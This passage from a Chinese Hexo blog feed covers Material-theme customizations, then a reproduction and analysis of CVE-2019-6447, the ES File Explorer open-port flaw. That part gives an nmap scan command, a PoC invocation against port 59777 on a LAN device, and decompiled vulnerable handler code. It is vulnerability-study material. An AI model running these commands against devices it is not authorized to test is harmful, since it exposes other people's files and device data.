title="底部添加访客数、运行时间站点字数"></a>底部添加访客数、运行时间站点字数</h2><p>该部分需要wordcount支持，请参考下一小节<br><code>\hexo\blog\themes\material\layout\_partial\footer.ejs</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- Paradox Footer Left Section --&gt;</span><br><span class="line">&lt;%- partial(&#39;_partial&#x2F;footer-left&#39;) %&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--Copyright--&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;copyright&quot;&gt;</span><br><span class="line">    Copyright&amp;nbsp;©&amp;nbsp;&lt;span year&gt;&lt;&#x2F;span&gt;&amp;nbsp;&lt;%- config.title %&gt;</span><br><span class="line">    &lt;% if(theme.footer_text) &#123; %&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;% if(Array.isArray(theme.footer_text)) &#123; %&gt;</span><br><span class="line">            &lt;%- theme.footer_text.join(&#39;&lt;br&gt;&#39;) %&gt;</span><br><span class="line">        &lt;% &#125; else &#123; %&gt;</span><br><span class="line">            &lt;%- theme.footer_text %&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Paradox Footer Right Section --&gt;</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   &lt;!-- Paradox Footer Left Section --&gt;</span><br><span class="line">   &lt;%- partial(&#39;_partial&#x2F;footer-left&#39;) %&gt;</span><br><span class="line">   &lt;!--Copyright--&gt;</span><br><span class="line">   &lt;div id&#x3D;&quot;copyright&quot;&gt;</span><br><span class="line">       Copyright&amp;nbsp;©&amp;nbsp;&lt;span year&gt;&lt;&#x2F;span&gt;&amp;nbsp;</span><br><span class="line">       &lt;%- config.title %&gt;</span><br><span class="line">       &lt;% if(theme.footer_text) &#123; %&gt;</span><br><span class="line">       &lt;br&gt;</span><br><span class="line">       &lt;% if(Array.isArray(theme.footer_text)) &#123; %&gt;</span><br><span class="line">       &lt;%- theme.footer_text.join(&#39;&lt;br&gt;&#39;) %&gt;</span><br><span class="line">       &lt;% &#125; else &#123; %&gt;</span><br><span class="line">       &lt;%- theme.footer_text %&gt;</span><br><span class="line">       &lt;% &#125; %&gt;</span><br><span class="line">       &lt;% &#125; %&gt;</span><br><span class="line">       &lt;% if(theme.busuanzi.all_site_uv &#x3D;&#x3D;&#x3D; true) &#123; %&gt;</span><br><span class="line">   &lt;!-- All Site UV --&gt;</span><br><span class="line">   &lt;br &#x2F;&gt;</span><br><span class="line">   &lt;span id&#x3D;&quot;busuanzi_container_site_uv&quot;&gt;本站访客数</span><br><span class="line">       &lt;span id&#x3D;&quot;busuanzi_value_site_uv&quot;&gt;</span><br><span class="line">       &lt;&#x2F;span&gt;</span><br><span class="line">   &lt;&#x2F;span&gt;|</span><br><span class="line">   &lt;span id&#x3D;&quot;busuanzi_container_site_pv&quot;&gt;本站总访问量</span><br><span class="line">       &lt;span id&#x3D;&quot;busuanzi_value_site_pv&quot;&gt;</span><br><span class="line">           </span><br><span class="line">       &lt;&#x2F;span&gt;</span><br><span class="line">   &lt;&#x2F;span&gt;|</span><br><span class="line">   &lt;i class&#x3D;&quot;material-icons&quot;&gt;keyboard&lt;&#x2F;i&gt;站点总字数&lt;span class&#x3D;&quot;post-count&quot;&gt;&lt;%&#x3D; totalcount(site) %&gt;&lt;&#x2F;span&gt;</span><br><span class="line">   &lt;% &#125; %&gt;</span><br><span class="line">   &lt;div class&#x3D;&quot;footer-site-time&quot;&gt;</span><br><span class="line">   &lt;span id&#x3D;&quot;timeDate&quot;&gt;载入天数...&lt;&#x2F;span&gt;</span><br><span class="line">   &lt;span id&#x3D;&quot;times&quot;&gt;载入时分秒...&lt;&#x2F;span&gt;</span><br><span class="line">   &lt;&#x2F;div&gt;</span><br><span class="line">   &lt;&#x2F;div&gt;</span><br><span class="line">   </span><br><span class="line">   &lt;script&gt;</span><br><span class="line">   var now &#x3D; new Date(); </span><br><span class="line">   function createtime() &#123; </span><br><span class="line">       var grt&#x3D; new Date(&quot;01&#x2F;01&#x2F;2016 00:00:00&quot;);&#x2F;&#x2F;此处修改你的建站时间或者网站上线时间 </span><br><span class="line">       now.setTime(now.getTime()+250); </span><br><span class="line">       days &#x3D; (now - grt ) &#x2F; 1000 &#x2F; 60 &#x2F; 60 &#x2F; 24; dnum &#x3D; Math.floor(days); </span><br><span class="line">       hours &#x3D; (now - grt ) &#x2F; 1000 &#x2F; 60 &#x2F; 60 - (24 * dnum); hnum &#x3D; Math.floor(hours); </span><br><span class="line">       if(String(hnum).length &#x3D;&#x3D;1 )&#123;hnum &#x3D; &quot;0&quot; + hnum;&#125; minutes &#x3D; (now - grt ) &#x2F; 1000 &#x2F;60 - (24 * 60 * dnum) - (60 * hnum); </span><br><span class="line">       mnum &#x3D; Math.floor(minutes); if(String(mnum).length &#x3D;&#x3D;1 )&#123;mnum &#x3D; &quot;0&quot; + mnum;&#125; </span><br><span class="line">       seconds &#x3D; (now - grt ) &#x2F; 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); </span><br><span class="line">       snum &#x3D; Math.round(seconds); if(String(snum).length &#x3D;&#x3D;1 )&#123;snum &#x3D; &quot;0&quot; + snum;&#125; </span><br><span class="line">       document.getElementById(&quot;timeDate&quot;).innerHTML &#x3D; &quot;本站已安全运行 &quot;+dnum+&quot; 天 &quot;; </span><br><span class="line">       document.getElementById(&quot;times&quot;).innerHTML &#x3D; hnum + &quot; 小时 &quot; + mnum + &quot; 分 &quot; + snum + &quot; 秒&quot;; </span><br><span class="line">   &#125; </span><br><span class="line">   setInterval(&quot;createtime()&quot;,250);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="首页底部分页优化"><a href="#首页底部分页优化" class="headerlink" title="首页底部分页优化"></a>首页底部分页优化</h2><p><code>\hexo\blog\themes\material\source\css\style.min.css</code></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#scheme-Paradox</span> <span class="selector-class">.page-number</span> &#123;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">2</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">top</span>: -<span class="number">1px</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">11px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.pagination</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">120px</span> <span class="number">0</span> <span class="number">40px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">1px</span> solid <span class="number">#eee</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#scheme-Paradox</span> <span class="selector-class">.material-nav</span> <span class="selector-class">.page-number</span><span class="selector-class">.current</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">border-top-color</span>: <span class="number">#ccc</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果图<br><img src= "/img/loading.gif" data-lazy-src="/images/kSISTKX.png" alt=""></p><h1 id="文章页"><a href="#文章页" class="headerlink" title="文章页"></a>文章页</h1><p>头部添加阅读时长需要wordcount插件<br>首先，cd到你的blog目录，然后执行<code>npm i --save hexo-wordcount</code>,<br>修改文件<br><code>hexo\blog\themes\material\layout\_partial\Paradox-post-info.ejs</code><br>部分内容如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    &lt;% if(theme.wordcount.enable &#x3D;&#x3D;&#x3D; true) &#123; %&gt;</span><br><span class="line">    |</span><br><span class="line">    &lt;i class&#x3D;&quot;material-icons&quot;&gt;keyboard&lt;&#x2F;i&gt;&lt;span class&#x3D;&quot;post-count&quot;&gt;本文共:&lt;%&#x3D; wordcount(page.content) %&gt;字&lt;&#x2F;span&gt;</span><br><span class="line">    |</span><br><span class="line">    &lt;i class&#x3D;&quot;material-icons&quot;&gt;query_builder&lt;&#x2F;i&gt;&lt;span class&#x3D;&quot;post-count&quot;&gt;阅读时间≈&lt;%&#x3D; min2read(page.content) %&gt;分&lt;&#x2F;span&gt;</span><br><span class="line">    |</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">    &lt;!-- Favorite --&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">    &lt;button id&#x3D;&quot;article-functions-like-button&quot; class&#x3D;&quot;mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like&quot;&gt;</span><br><span class="line">        &lt;i class&#x3D;&quot;material-icons&quot; role&#x3D;&quot;presentation&quot;&gt;favorite&lt;&#x2F;i&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;visuallyhidden&quot;&gt;favorites&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;button&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p><code>\hexo\blog\themes\material\_config.yml</code>文件末尾添加内容如下</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section">#wordcount</span></span><br><span class="line">wordcount:</span><br><span class="line"><span class="code">    enable: true</span></span><br></pre></td></tr></table></figure><p>然后重新生成页面<br>首页下部截图<br><img src= "/img/loading.gif" data-lazy-src="/images/S736bs1.png" alt=""><br>文章页截图<br><img src= "/img/loading.gif" data-lazy-src="/images/PjRWXTZ.png" alt=""></p><h2 id="删除分享列表内的浏览人数并转移到外部"><a href="#删除分享列表内的浏览人数并转移到外部" class="headerlink" title="删除分享列表内的浏览人数并转移到外部"></a>删除分享列表内的浏览人数并转移到外部</h2><p>文件<code>\hexo\blog\themes\material\layout\_partial\post-info-share.ejs</code><br>删除</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% if(theme.busuanzi.enable &#x3D;&#x3D;&#x3D; true) &#123; %&gt;</span><br><span class="line">    &lt;% if(theme.busuanzi.post_pv &#x3D;&#x3D;&#x3D; true) &#123; %&gt;</span><br><span class="line">        &lt;!-- Busuanzi Views --&gt;</span><br><span class="line">        &lt;a class&#x3D;&quot;post_share-link&quot; href&#x3D;&quot;#&quot;&gt;</span><br><span class="line">            &lt;li class&#x3D;&quot;mdl-menu__item&quot;&gt;</span><br><span class="line">                &lt;span id&#x3D;&quot;busuanzi_container_page_pv&quot;&gt;</span><br><span class="line">                    &lt;span id&#x3D;&quot;busuanzi_value_page_pv&quot;&gt;&lt;&#x2F;span&gt;&amp;nbsp;&lt;%&#x3D; __(&#39;post.views&#39;) %&gt;</span><br><span class="line">                &lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;li&gt;</span><br><span class="line">        &lt;&#x2F;a&gt;</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>文件<code>\hexo\blog\themes\material\layout\_partial\Paradox-post-info.ejs</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- Author Name &amp; Date --&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;strong&gt;&lt;%&#x3D; config.author %&gt;&lt;&#x2F;strong&gt;</span><br><span class="line">    &lt;span&gt;&lt;%&#x3D; date(page.date, &#39;MMM DD, YYYY&#39;) %&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class&#x3D;&quot;section-spacer&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Favorite --&gt;</span><br><span class="line">&lt;!--</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- Author Name &amp; Date --&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;strong&gt;&lt;%&#x3D; config.author %&gt;&lt;&#x2F;strong&gt;</span><br><span class="line">    &lt;span&gt;&lt;%&#x3D; date(page.date, &#39;MMM DD, YYYY&#39;) %&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;section-spacer&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;% if(theme.busuanzi.enable &#x3D;&#x3D;&#x3D; true) &#123; %&gt;</span><br><span class="line">&lt;% if(theme.busuanzi.post_pv &#x3D;&#x3D;&#x3D; true) &#123; %&gt;</span><br><span class="line">&lt;!-- Busuanzi Views --&gt;</span><br><span class="line">&lt;span id&#x3D;&quot;busuanzi_container_page_pv&quot;&gt;</span><br><span class="line">            &lt;span id&#x3D;&quot;busuanzi_value_page_pv&quot;&gt;&lt;&#x2F;span&gt;&amp;nbsp;</span><br><span class="line">&lt;%&#x3D; __(&#39;post.views&#39;) %&gt;</span><br><span class="line">&lt;&#x2F;span&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line">&lt;!-- Favorite --&gt;</span><br><span class="line">&lt;!--</span><br></pre></td></tr></table></figure><p>预览图<br><img src= "/img/loading.gif" data-lazy-src="/images/yruh3Pq.png" alt=""></p><h2 id="文章底部添加前后文章名"><a href="#文章底部添加前后文章名" class="headerlink" title="文章底部添加前后文章名"></a>文章底部添加前后文章名</h2><p>文件<code>\hexo\blog\themes\material\layout\_partial\post-nav.ejs</code></p><p><code>&lt;%= __(&#39;post.older&#39;) %&gt;</code>改为<code>&lt;%= page.next.title %&gt;</code><br><code>&lt;%= __(&#39;post.newer&#39;) %&gt;</code>改为``&lt;%= page.prev.title %&gt;`<br>如图<br><img src= "/img/loading.gif" data-lazy-src="/images/s38MFFX.png" alt=""><br>预览图<br><img src= "/img/loading.gif" data-lazy-src="/images/sPE20Hb.png" alt=""></p><h2 id="文章标题修复"><a href="#文章标题修复" class="headerlink" title="文章标题修复"></a>文章标题修复</h2><p><code>\hexo\blog\themes\material\layout\_partial\Paradox-post_entry.ejs</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p class&#x3D;&quot;article-headline-p&quot;&gt;&lt;a href&#x3D;&quot;&lt;%&#x3D; url_for(post.path) %&gt;&quot;&gt;&lt;% if(pin) &#123; %&gt;&lt;span&gt;[Top]&lt;&#x2F;span&gt;&lt;% &#125; %&gt;&lt;%&#x3D; post.title %&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;a class&#x3D;&quot;article-headline-p&quot; href&#x3D;&quot;&lt;%&#x3D; url_for(post.path) %&gt;&quot; &gt;&lt;% if(pin) &#123; %&gt;&lt;span&gt;[Top]&lt;&#x2F;span&gt;&lt;% &#125; %&gt;&lt;%&#x3D; post.title %&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><h2 id="利用-Fancybox-添加图片放大预览查看功能"><a href="#利用-Fancybox-添加图片放大预览查看功能" class="headerlink" title="利用 Fancybox 添加图片放大预览查看功能"></a>利用 Fancybox 添加图片放大预览查看功能</h2><p>首先把fancybox的dist目录下的.min.js文件解压到<code>\hexo\blog\themes\material\source\js</code>目录下，然后把.min.css文件解压到<code>\hexo\blog\themes\material\source\css</code>目录下，然后把下面的JS代码保存为utils.js扔到<code>\hexo\blog\themes\material\source\js</code>目录下<br>utils.js</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    wrapImageWithFancyBox();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Wrap images with fancybox support.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wrapImageWithFancyBox</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">'img'</span>).not(<span class="string">'.sidebar-image img'</span>).not(<span class="string">'#author-avatar img'</span>).not(<span class="string">".mdl-menu img"</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> $image = $(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">var</span> imageCaption = $image.attr(<span class="string">'alt'</span>);</span><br><span class="line">        <span class="keyword">var</span> $imageWrapLink = $image.parent(<span class="string">'a'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($imageWrapLink.size() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> src = <span class="keyword">this</span>.getAttribute(<span class="string">'src'</span>);</span><br><span class="line">            <span class="keyword">var</span> idx = src.lastIndexOf(<span class="string">'?'</span>);</span><br><span class="line">            <span class="keyword">if</span> (idx != <span class="number">-1</span>) &#123;</span><br><span class="line">                src = src.substring(<span class="number">0</span>, idx);</span><br><span class="line">            &#125;</span><br><span class="line">            $imageWrapLink = $image.wrap(<span class="string">'&lt;a href="'</span> + src + <span class="string">'"&gt;&lt;/a&gt;'</span>).parent(<span class="string">'a'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $imageWrapLink.attr(<span class="string">'data-fancybox'</span>, <span class="string">'images'</span>);</span><br><span class="line">        <span class="keyword">if</span> (imageCaption) &#123;</span><br><span class="line">            $imageWrapLink.attr(<span class="string">'data-caption'</span>, imageCaption);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $().fancybox(&#123;</span><br><span class="line">        selector : <span class="string">'[data-fancybox="images"]'</span>,</span><br><span class="line">        thumbs : <span class="literal">true</span>,</span><br><span class="line">        hash : <span class="literal">false</span>,</span><br><span class="line">        loop : <span class="literal">false</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>\hexo\blog\themes\material\source\js</code>目录结构大致如下<br><img src= "/img/loading.gif" data-lazy-src="/images/Ye7UZud.png" alt=""><br><code>\hexo\blog\themes\material\source\css</code>目录结构大致如下<br><img src= "/img/loading.gif" data-lazy-src="/images/xMzzCZJ.png" alt=""><br>然后在<code>/material/layout/_partial/head.ejs</code>文件</head>标签之前加入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- fancybox support --&gt;</span><br><span class="line">&lt;% if(theme.fancybox &#x3D;&#x3D;&#x3D; true) &#123; %&gt;</span><br><span class="line">    &lt;%- cssLsload(&#123;path:(&#39;css&#x2F;jquery.fancybox.min.css&#39;),key:&#39;fancybox_css&#39;&#125;) %&gt;</span><br><span class="line">    &lt;%- jsLsload(&#123;path:(&#39;js&#x2F;jquery.fancybox.min.js&#39;),key:&#39;fancybox_js&#39;&#125;) %&gt;</span><br><span class="line">    &lt;%- jsLsload(&#123;path:(&#39;js&#x2F;utils.js&#39;),key:&#39;utils_js&#39;&#125;) %&gt;</span><br><span class="line">&lt;% &#125;%&gt;</span><br></pre></td></tr></table></figure><p>然后重新生成网页[hexo g]就可以了</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-6447复现与分析</title>
      <link href="/p/1248545765.html"/>
      <url>/p/1248545765.html</url>
      
        <content type="html"><![CDATA[<p>简单分析下CVE-2019-6447</p><a id="more"></a><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>ES File Explorer File Manager application for Android（ES文件浏览器或文件管理器）是一款基于Android系统的多功能手机文件、程序和进程管理器，它支持在手机、电脑、远程和蓝牙间浏览管理文件。 基于Android平台的ES File Explorer File Manager application 4.1.9.7.4及之前版本中存在安全漏洞，该漏洞源于ES应用程序在运行一次之后（CVE-2019-6447），该端口并未关闭依旧可以通过HTTP协议接收JSON数据。攻击者可通过向TCP 59777端口发送请求利用该漏洞读取任意文件或执行应用程序。</p><h1 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>Github地址：<a href="https://github.com/fs0c131y/ESFileExplorerOpenPortVuln" target="_blank" rel="noopener">https://github.com/fs0c131y/ESFileExplorerOpenPortVuln</a></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li><p>安装ES文件管理器，版本低于4.1.9.7.4并启动，不执行任何操作<br><img src= "/img/loading.gif" data-lazy-src="/images/kE3atnM.jpg" alt=""></p></li><li><p>接入与电脑同一局域网<br><img src= "/img/loading.gif" data-lazy-src="/images/c245pIe.png" alt=""></p></li><li><p>对指定设备进行扫描<br><code>nmap -sS -p 1-65535 -v 192.168.2.63</code><br><img src= "/img/loading.gif" data-lazy-src="/images/IGl4o0B.png" alt=""></p></li><li><p>验证POC<br>执行命令<code>python3 poc.py --cmd getDeviceInfo --network 192.168.2.</code><br><img src= "/img/loading.gif" data-lazy-src="/images/xCyyXjU.png" alt=""></p></li></ol><p>回显设备信息和FTP端口号<br>复现成功</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>从一些渠道下载到了低于官网的软件安装包，然后解包后将3个classes.dex转为jar<br>最终目录图如下<br><img src= "/img/loading.gif" data-lazy-src="/images/8P1fu00.png" alt=""></p><p>用JD-GUI打开JAR包<br><img src= "/img/loading.gif" data-lazy-src="/images/iTJfqEf.png" alt=""></p><p>对POC中的关键字如<code>59777</code>、<code>command</code>等进行全局搜索，最终取得执行漏洞的关键代码和，具体如下</p><h1 id="漏洞包关键代码"><a href="#漏洞包关键代码" class="headerlink" title="漏洞包关键代码"></a>漏洞包关键代码</h1><h2 id="开启服务器相关代码"><a href="#开启服务器相关代码" class="headerlink" title="开启服务器相关代码"></a>开启服务器相关代码</h2><h2 id="com-estrongs-android-f-a"><a href="#com-estrongs-android-f-a" class="headerlink" title="com.estrongs.android.f.a"></a><code>com.estrongs.android.f.a</code></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">a</span><span class="params">(<span class="keyword">boolean</span> paramBoolean)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> bool1 = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">synchronized</span> (g)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((f != <span class="keyword">null</span>) &amp;&amp; (f.d())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      a locala = f;</span><br><span class="line">      <span class="keyword">if</span> (locala == <span class="keyword">null</span>) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      f.i();</span><br><span class="line">      f = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (;;)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">5</span>) &#123;</span><br><span class="line">          <span class="keyword">try</span></span><br><span class="line">          &#123;</span><br><span class="line">            f = <span class="keyword">new</span> a(<span class="string">"/sdcard"</span>, <span class="number">59777</span> + i, paramBoolean);</span><br><span class="line">            <span class="keyword">int</span> j = <span class="number">1000</span>;</span><br><span class="line">            <span class="keyword">while</span> (j &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">boolean</span> bool2 = f.d();</span><br><span class="line">              <span class="keyword">if</span> (bool2)</span><br><span class="line">              &#123;</span><br><span class="line">                paramBoolean = bool1;</span><br><span class="line">                <span class="keyword">return</span> paramBoolean;</span><br><span class="line">                localObject2 = <span class="keyword">finally</span>;</span><br><span class="line">                <span class="keyword">throw</span> localObject2;</span><br><span class="line">              &#125;</span><br><span class="line">              Thread.sleep(<span class="number">200L</span>);</span><br><span class="line">              j -= <span class="number">200</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">catch</span> (Exception localException1)</span><br><span class="line">          &#123;</span><br><span class="line">            f = <span class="keyword">null</span>;</span><br><span class="line">            localException1.printStackTrace();</span><br><span class="line">            i += <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception localException2)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (;;)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">        paramBoolean = <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>其中a继承自c。</p><h1 id="com-estrongs-android-f-c"><a href="#com-estrongs-android-f-c" class="headerlink" title="com.estrongs.android.f.c"></a><code>com.estrongs.android.f.c</code></h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">c</span><span class="params">(<span class="keyword">int</span> paramInt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.b = paramInt;</span><br><span class="line">  <span class="keyword">this</span>.l = <span class="keyword">new</span> ServerSocket(<span class="keyword">this</span>.b);</span><br><span class="line">  <span class="keyword">this</span>.c = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable()</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> (!c.a(c.<span class="keyword">this</span>)) &#123;</span><br><span class="line">          <span class="keyword">new</span> c.a(c.<span class="keyword">this</span>, c.b(c.<span class="keyword">this</span>).accept());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (IOException localIOException) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">this</span>.c.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">  <span class="keyword">this</span>.c.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="com-estrongs-android-f-a-1"><a href="#com-estrongs-android-f-a-1" class="headerlink" title="com.estrongs.android.f.a"></a><code>com.estrongs.android.f.a</code></h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> c.<span class="function">b <span class="title">a</span><span class="params">(String paramString1, String paramString2, Properties paramProperties1, Properties paramProperties2, Properties paramProperties3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (paramString1.startsWith(<span class="string">"/estrongs_filemgr_oauth_result"</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    paramString1 = CreateOAuthNetDisk.b();</span><br><span class="line">    <span class="keyword">if</span> (paramString1 != <span class="keyword">null</span>) &#123;</span><br><span class="line">      paramString1.a(paramProperties2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (paramString2.equals(<span class="string">"POST"</span>))<span class="comment">//判断发送方法是否为POST</span></span><br><span class="line">  &#123;</span><br><span class="line">    localObject = <span class="keyword">new</span> String(g());</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      localObject = <span class="keyword">new</span> JSONObject((String)localObject);<span class="comment">//JSONG解码</span></span><br><span class="line">      String str = ((JSONObject)localObject).getString(<span class="string">"command"</span>);<span class="comment">//获取JSON中command字段值</span></span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listFiles"</span>)) &#123;<span class="comment">//获取文件列表</span></span><br><span class="line">        <span class="keyword">return</span> b(paramString1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listPics"</span>)) &#123;<span class="comment">//获取图片列表</span></span><br><span class="line">        <span class="keyword">return</span> d();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listVideos"</span>)) &#123;<span class="comment">//获取视频列表</span></span><br><span class="line">        <span class="keyword">return</span> e();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listAudios"</span>)) &#123;<span class="comment">//获取音频列表</span></span><br><span class="line">        <span class="keyword">return</span> f();</span><br><span class="line">      &#125;</span><br><span class="line">      